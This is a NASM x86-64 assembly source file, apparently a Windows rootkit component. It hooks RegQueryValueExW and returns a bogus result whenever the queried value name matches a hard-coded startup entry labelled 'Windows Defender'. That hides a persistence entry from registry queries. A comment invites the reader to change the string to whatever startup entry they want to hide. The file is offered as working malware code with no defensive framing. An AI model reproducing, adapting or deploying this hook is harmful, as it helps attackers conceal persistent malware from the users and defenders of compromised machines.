bits 64
default rel

%define u(x) __utf16__(x)

segment .data
	executable dw u('Windows Defender'), 0					; change this to whatever startup registry entry you want to hide

segment .text

extern wcscmp
extern gRetAddress
extern gContinueAddress
extern callback
extern RegQueryValueExW

global hook

restore:
	add rsp, 40h
	pop r9
	pop r8
	pop rdx
	pop rcx
	mov rdi, rdx						; execute overidden instructions
	mov rsi, rcx
	call RegQueryValueExW
	jmp exit

hook:	
	push rcx
	push rdx
	push r8
	push r9
	sub rsp, 40h

	mov rcx, executable
	call wcscmp

	test eax, eax
	jz hide

	jmp restore

hide:
	call callback
	mov rax, 1823h		; bogus value
	add rsp, 40h
	pop r9
	pop r8
	pop rdx
	pop rcx
	
	jmp exit

exit:
	jmp [gContinueAddress]